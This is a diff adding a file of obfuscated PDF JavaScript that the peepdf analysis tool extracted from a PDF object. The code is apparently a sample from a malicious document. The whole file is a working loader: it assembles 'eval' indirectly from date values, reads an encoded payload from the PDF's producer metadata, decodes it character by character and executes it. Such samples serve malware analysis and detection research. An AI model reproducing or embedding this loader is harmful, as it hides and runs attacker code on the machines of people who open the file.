@@ -1,0 +1,28 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [() <</S /JavaScript
+/JS (
+var obgds='';
+mlne = new Date(2010,11,3,2,21);
+var sssyl =mlne.getHours()+'val';
+sssyl = sssyl.replace(2,'e');
+usw = app;
+zzr=usw[sssyl];
+sqg = 'thi'+mlne.getHours()+'ducer';
+qxm=zzr(sqg.replace(2,'s.pro'));
+qxm = qxm.substr(4);
+ar = qxm.split(',');
+var s = '';
+w = mlne.getHours();
+var psd = 'fro'+mlne.getHours()+'arCode';
+psd=psd.replace(2,'mCh');
+fue=String[psd];
+for (i = 0; i < ar.length; i++) {
+	mgea = zzr(ar[i]);
+	s += fue(mgea);
+}
+zzr(s);
+)
+>>]
+>>
+
